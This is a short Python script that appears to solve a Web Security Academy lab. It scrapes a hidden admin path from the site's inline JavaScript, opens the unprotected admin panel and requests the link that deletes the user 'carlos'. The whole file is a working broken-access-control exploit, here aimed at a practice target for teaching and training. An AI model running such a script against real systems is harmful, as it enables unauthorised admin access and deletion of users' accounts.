import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ace01fa91e1995b5c0f91729004600d5.web-security-academy.net'


url = f'https://{site}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
script = soup.find_all('script')[1].contents[0]
match_line = [line for line in script.split('\n') if 'admin-' in line]
uri = match_line[0].split("'")[3]


url = f'https://{site}{uri}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')


carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]


delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')